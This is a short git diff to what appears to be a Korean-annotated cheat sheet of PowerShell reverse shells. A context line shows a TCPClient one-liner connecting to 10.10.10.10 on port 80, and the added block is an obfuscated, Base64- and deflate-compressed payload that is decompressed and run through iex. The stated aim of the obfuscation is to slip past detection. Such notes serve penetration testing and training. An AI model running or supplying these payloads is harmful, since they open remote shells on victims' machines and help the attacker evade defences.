@@ -68,6 +68,11 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 
 ```
 
+```powershell
+# oneliner, obfuscated with Invoke-Obfuscate
+ ( neW-ObjECT  io.STreaMREadeR( (neW-ObjECT  IO.CoMPrESsion.DeflATEstReAM( [IO.MEmOrySTREaM] [conVert]::frOmbAsE64StRing('jY+xasMwEIb3QN7hMB3SwXKTKB0yJqG0m8GBLF2EfK4EjiTuzqUm5N2rYELW3HLww33/dyfne4TF8hUu8xnkacSQlDsvfCQTuEOCsokDWYTCiaRtVa21etdqpbVa6k3VRsvVVxCK7WDFx6BS2xVQHpDFB3NLoHjB8LsdGClR7HLjdzNyj2fwQZBoSMIK/zBf1eQjeRnh0/+4yehI413uIVhTtMgM5Uem1Ubc0x0T6TqtvRHr4PIIJnrTI6b8N9oYWob123x2/Qc='),[IO.comPRessIon.cOMPrESSionMOde]::DEcoMprESS) ) ,[sYSTEm.TEXt.EncoDING]::aScIi)).REAdToENd()| iEX
+```
+
 
 
 (계속 추가 예정)
